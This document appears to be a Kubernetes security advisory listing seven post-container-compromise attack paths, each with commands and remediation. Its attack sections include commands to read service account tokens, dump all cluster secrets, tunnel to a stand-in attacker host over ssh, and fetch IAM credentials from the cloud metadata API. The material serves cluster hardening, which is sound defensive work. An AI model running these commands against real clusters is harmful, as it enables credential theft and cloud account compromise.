@@ -1,0 +1,142 @@
+Improving the Default Security Posture Through Defense in Depth
+
+
+Assumptions
+The external attack surface of most kubernetes clusters is typically limited to the API server, SSH to the nodes, and any exposed service.  However, there are at least two conditions where a malicious user can gain access inside the cluster:
+
+Insert malicious code into a container that gets run by an authorized user as a part of a deployment or Helm chart.  e.g. A working image that also has a backdoor/shell callback embedded.
+An externally exposed container application is vulnerable to remote code execution, local/remote file inclusion, command injection, or arbitrary URL fetching.  e.g. Apache Struts CVE-2017-9791, "ShellShock", vulnerable Wordpress plugin, or Jinja template injection.
+
+Should either of these conditions occur, the result is a malicious user/program would have the equivalent of a shell inside a container/pod on the cluster.  It is at this point that many cluster installations by default provide multiple avenues for privilege escalation inside Kubernetes, full cluster credential compromise, root access to the underlying node, and leakage of privileged cloud account keys/secrets/tokens--providing access to other cloud resources in that account outside of the cluster.
+I have evaluated eight commonly used cluster installers across the major public cloud providers so far, and found a common set of post-exploit attack patterns that summarize themselves into the set of issues noted below.
+Not all cluster installations are vulnerable to all issues listed below, but each one is present in at least one cluster by default.
+I recognize that the bulk of these findings have been identified already as isolated issues, but I believe that there is merit to gathering them in one place to be able to see their combined effects.
+Purpose
+To raise the security awareness of the cluster installers/admins/operators of the kinds of potentially significant downstream attacks so that they may take appropriate security hardening steps to mitigate them, and to aid the cluster installation tool projects in making positive changes to the security posture of clusters built using those tools by default.
+Post-Container Compromise Issues
+1. Default Namespace Tokens Have Full Privileges
+Risk: High
+Attack
+From a shell inside a container/pod after installing a copy of kubectl into the container (sensitive items have been truncated):
+bash-4.3# curl -sLO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin
+bash-4.3# cat /var/run/secrets/kubernetes.io/serviceaccount/token
+eyJhbGciOiJSUzI1NiIsI...
+bash-4.3# kubectl get secrets --all-namespaces -o yaml
+apiVersion: v1
+items:
+- apiVersion: v1
+  data:
+    ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUM2RE... 
+Result
+If the auto-mounted token has the equivalent of full cluster permissions, this is considered credential exposure that allows for privilege escalation in most cases.  This may allow:
+
+Running privileged containers that mount the underlying host filesystem read/write to add ssh keys, and run docker/runc/rkt commands -- becoming root on the host.
+Extraction of secrets, configmaps, pod environment variables, and more which may include API Keys, User/Password pairs, cloud account keys, etc.
+
+Remediation
+A small number of installers do not enforce RBAC by default on the latest versions.  You may need to customize the default options in your installation tool to enable RBAC authorization if it doesn't already. Here is what a similar container/pod looks like when hitting an API server with RBAC enabled using the default namespace serviceaccount token:
+bash-4.3# bash-4.3# kubectl get pods --all-namespaces
+Error from server (Forbidden): User "system:serviceaccount:default:default" cannot list pods at the cluster scope.: Unknown user "system:serviceaccount:default:default" (get pods)
+2. Unprotected Kubernetes Dashboard and Other kube-system Add-ons
+Risk: High
+Attack
+From a shell inside a container/pod using curl:
+bash-4.3# curl -sk http://kubernetes-dashboard.kube-system
+ <!doctype html> <html ng-app="kubernetesDashboard"> <head> <meta charset="utf-8"> <title ng-controller="kdTitle as $ctrl" ng-bind="$ctrl.title()"></title> <link rel="icon" type="image/png" href="assets/images/kubernetes-logo.png"> <meta name="viewport" content= ...
+This means that the attacker can run a command such as:
+bash-4.3# ssh -R 8080:ip.of.dashboard.svc:80 attacker@mybaddomain.com
+Which allows them to run a browser directed at http://localhost:8080 and reach the dashboard.
+Result
+Typically, the kubernetes-dashboard is granted a full-privilege serviceaccount to be able to see and manage all aspects of the cluster.  It has the same net effect as Issue #1 above.
+Remediation
+There are a few options for preventing this attack:
+
+If you do not use the dashboard, uninstall it from your cluster.
+If you use the dashboard and have a CNI provider that enforces networkpolicy rules, deploy a networkpolicy that blocks network access to the kubernetes-dashboard.  This forces the use of kubectl proxy to gain access to the dashboard--a typical workflow.
+
+3. Kubelet Does Not Enforce Authorization (aka Kubelet-Exploit)
+Risk: High
+Attack
+See https://github.com/kayrus/kubelet-exploit
+Result
+Most often, the worker node running the compromised pod is reachable on the kubelet API port of 10250.  However, many cluster security groups allow free-flowing traffic between all worker nodes (or even to the masters) to support the diverse workloads that may run on them.  This means that it is often possible to leverage kubelets running on other workers and the master nodes to run commands in any container in any namespace which can allow for:
+
+Extraction of secrets and configmaps mounted inside containers, sensitive environment variables, and more which may include API Keys, User/Password pairs, cloud account keys, etc.
+Stealing of source code, stateful data on volumes, and sensititve workload data.
+
+Remediation
+Ensure that the kubelet is enforcing --authorization-mode=Webhook and --anonymous-auth=false to prevent these API calls from succeeding anonymously.
+4. Unprotected Etcd/Calico-Etcd Endpoints
+Risk: High
+Attack
+While etcd in clusters running 1.6+ is rarely not protected with TLS certificate authentication, some legacy (< 1.6) implementations and current implementations running a separate calico-etcd instance for calico network policy storage expose those endpoints such that pods can reach them without requiring valid TLS certificates.
+bash-4.3# curl -s http://calico-etcd.kube-system:6666/v2/keys
+...json dump...
+Result
+In the case of etcd which backs the cluster, this is essentially bypassing the kube-apiserver and querying the datastore directly.  It provides the same information accessible from Issue #1 and #2 above.
+In the case of calico-etcd, it means direct access to view/manipulate the network profiles used by calico to enforce network ingress and egress rules.  It may, for instance, allow an attacker to disable a blocked pathway to a protected pod such as the kubernetes-dashboard.
+Remediation
+Implement TLS authentication on any etcd endpoint and additionally leverage networkpolicy and/or firewall policies on the underlying instances to prevent access to the endpoints should TLS certificates be obtained another way.
+5. Direct Access to Cloud Instance Metadata APIs
+Risk: Low-High
+Attack
+Because components inside Kubernetes often require autonomous bootstrapping and access to supporting services from external/cloud providers, many installers leverage data stored in user-data scripts upon node startup alongside per-instance access keys granted via IAM for things like access to S3 buckets, Container registries, DNS records, LoadBalancing, and more.
+However, in nearly every case, this network traffic is permitted by default from all pods in the cluster:
+bash-4.3# curl -s http://169.254.169.254/latest/user-data
+...cloud config or shell script...
+Obtaining temporary IAM credentials for a IAM Role named worker-node-IAM-policy
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/worker-node-IAM-policy
+{
+  "Code" : "Success",
+  "LastUpdated" : "2017-09-07T05:47:34Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "<redacted>",
+  "SecretAccessKey" : "<redacted>",
+  "Token" : "<redacted>",
+  "Expiration" : "2017-09-07T11:51:38Z"
+}
+Result
+The user-data script often contains sensitive items such as the kube-adm join token, base64 encoded TLS keys, S3 bucket locations where sensitive assets are located, and more.
+Remediation
+Which prevention mechanism depends on the workload and desired capabilities of the cluster, but primarily, they are:
+
+If no pods need to access the cloud metadata IP (169.254.169.254), leverage iptables rules to block that traffic.
+If certain pods need access to the cloud metadata IP, a solution such as kube2iam or kiam can offer a mechanism to prevent that access with a whitelist for certain pods that need it.
+
+6. Permissive Metadata IAM Role Policies (AWS)
+Risk: Low-High
+Attack
+Many AWS-based Kubernetes installations leverage supporting AWS services such as EC2, S3, Route53, ELB, Autoscaling, ECR, and more.  As such, many installers by default assign IAM Roles to instances granting various types of permissions to those services should pods need them.
+Most worker nodes running in AWS are granted ec2:Describe*, which limits EC2 API calls to those actions that start with describe-.  e.g. aws ec2 describe-instances or aws ec2 describe-regions.  In some cases, worker nodes are granted ec2:* which allows for the equivalent of aws ec2 * commands to be performed should an attacker get access to those IAM Role credentials via the Metadata API.
+Nearly every worker node is granted permissions to login/list/retrieve ECR images from ECR registries in the account.
+In addition, nearly every IAM Role policy applied to master nodes grants ec2:* permissions (among others).  Should an attacker have the ability to schedule a pod on a master, they can then access the EC2 IAM credentials with the elevated AWS permissions given to the master nodes.
+Result
+The ability to query the EC2 API for all the instance ids followed by the ability to use the aws ec2 describe-instance-attribute --instance-id i-0123456789 --attribute userData gives compromised pods with access to IAM credentials the ability to read the user-data script of any instance in that account, not just instances from the current cluster.
+Access to the ECR registry allows for listing/pulling local copies of containers stored in ECR which can be sources for embedded secrets/credentials and source code.
+Access to the EC2 API with ec2:* can allow for destructive actions causing outages/data loss, but it can also allow for volume snapshotting, new instance creation, and volume mounting which can permit an attacker to read the filesystem of any instance in the account on a system they created and can access.
+Remediation
+While many installers follow similar permissions as referenced in https://docs.google.com/document/d/17d4qinC_HnIwrK0GHnRlD1FKkTNdN__VO4TH9-EzbIY/edit an even further tightening of IAM Role permissions as noted in kubernetes/kops#1873 should be done to ensure the concept of least privilege is followed if IAM credentials are ever compromised.
+7. Exposed /metrics APIs Allow for Pod/Svc Enumeration
+Risk: Low
+Attack
+Several services offer read-only API get requests to /metrics to support observability and monitoring of various system components.  This includes the kubelet, heapster, node-exporter, kube-state-metrics, and more.
+The following is the first few lines from accessing the kubelet "read-only" API on port 10255.  The kubelet exposes pod names and namespaces of what it is running on that node.
+bash-4.3# curl -sk http://10.0.0.156:10255/metrics
+# HELP cadvisor_version_info A metric with a constant '1' value labeled by kernel version, OS version, docker version, cadvisor version & cadvisor revision.
+# TYPE cadvisor_version_info gauge
+cadvisor_version_info{cadvisorRevision="", ... 
+Result
+While not directly useful in every situation, accessing the metrics from the kubelet and other endpoints like kube-state-metrics or node-exporter provides the equivalent of kubectl get pods and helps in enumerating what other workloads are running inside the cluster, what namespace they are running in, and what pod IP/svc they are on.
+Remediation
+Using a networking plugin/provider that can enforce networkpolicy rules to prevent access to these endpoints from non-monitoring pods like Prometheus is ideal for reducing an attacker's ability to easily and reliably map the cluster resources.
+Additional Considerations
+There are several other security hardening steps that may also help to further disrupt or prevent the attack paths above:
+1. PodSecurityPolicy
+For namespaces running external-facing or non-system workloads, it's recommended to deploy a podsecuritypolicy to prevent containers from running as the root user, writing to the filesystem inside the container, running as a privileged container, attaching to the host's network namespace, and more.
+2. NetworkPolicy
+By default, very few use cases require non-kube-system pods from accessing pods in the kube-system namespace, so this traffic should be considered for a networkpolicy that restricts this.
+If supported, implement egress rules on non-kube-system pods to prevent access to the system services running outside the nodePort range (e.g. 30000-32768).
+Separating applications/tenant workloads into different namespaces (e.g. app1, app2) with basic policies using namespace names to prevent app1 and app2 from reaching each other is also highly advisable.
+3. Admission Controllers
+Consider adding DenyEscalatingExec to prevent exec/attach on privileged pods, NodeRestriction to limit what the kubelet can see to its own workloads only, PodSecurityPolicy for the reasons above, and AlwaysPullImages to prevent one tenant from running a pod leveraging a locally cached container.
+/cc @timothysc
